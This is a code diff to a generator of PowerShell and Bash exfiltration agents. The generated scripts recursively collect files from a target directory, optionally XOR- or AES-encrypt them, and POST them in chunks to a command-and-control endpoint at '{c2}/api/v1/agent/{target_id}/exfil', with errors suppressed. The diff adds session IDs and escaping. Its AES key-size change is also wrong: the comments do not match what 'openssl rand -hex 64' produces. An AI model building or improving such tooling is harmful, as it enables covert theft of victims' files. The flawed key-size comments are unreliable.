@@ -131,6 +131,7 @@ function Send-Chunk($fname, $idx, $total, $b64) {{
         data_b64       = $b64
         encryption     = $encName
         encryption_meta = $encMeta
+        session_id     = $sessionId
     }} | ConvertTo-Json
     try {{
         Invoke-RestMethod -Uri "http://{c2}/api/v1/agent/{target_id}/exfil" `
@@ -143,6 +144,7 @@ function Send-Chunk($fname, $idx, $total, $b64) {{
 {enc_block}
 {send_fn}
 $chunkSize = {chunk_size}
+$sessionId = [System.Guid]::NewGuid().ToString()
 $files = Get-ChildItem -Path "{target_dir}" -Recurse -File{ext_filter}
 foreach ($f in $files) {{
     try {{
@@ -200,8 +202,8 @@ print join('',map{chr(ord($_)^$XOR_KEY)}split(//,\$d));
 '''
         elif encryption == "aes":
             enc_setup = (
-                'AES_KEY=$(openssl rand -hex 32)\n'
-                'AES_IV=$(openssl rand -hex 16)\n'
+                'AES_KEY=$(openssl rand -hex 64)\n'  # 64 hex chars = 32 bytes = 256 bits
+                'AES_IV=$(openssl rand -hex 32)\n'   # 32 hex chars = 16 bytes = 128 bits
                 'ENC_NAME="aes"\n'
                 'ENC_META="${AES_KEY}|${AES_IV}"'
             )
@@ -232,10 +234,12 @@ send_chunk() {{
             send_fn = f'''
 send_chunk() {{
     local FNAME="$1" IDX="$2" TOTAL="$3" B64="$4"
+    # Properly escape the encryption_meta for JSON
+    local ESCAPED_META=$(printf '%s' "$ENC_META" | sed 's/"/\\"/g' | sed "s/'/\\'/g")
     curl -s -X POST "http://{c2}/api/v1/agent/{target_id}/exfil" \\
         -H "Content-Type: application/json" \\
         -d "$(cat <<EOJSON
-{{"filename":"$FNAME","chunk_index":$IDX,"total_chunks":$TOTAL,"data_b64":"$B64","encryption":"$ENC_NAME","encryption_meta":"$ENC_META"}}
+{{"filename":"$FNAME","chunk_index":$IDX,"total_chunks":$TOTAL,"data_b64":"$B64","encryption":"$ENC_NAME","encryption_meta":"$ESCAPED_META","session_id":"$SESSION_ID"}}
 EOJSON
 )" >/dev/null 2>&1 || true
 }}
@@ -246,6 +250,7 @@ EOJSON
 {enc_fn}
 {send_fn}
 CHUNK_SIZE={chunk_size}
+SESSION_ID=$(uuidgen 2>/dev/null || python3 -c "import uuid; print(uuid.uuid4())" 2>/dev/null || echo "session_$(date +%s)_$$")
 
 {find_cmd} | while IFS= read -r file; do
     FNAME=$(basename "$file")
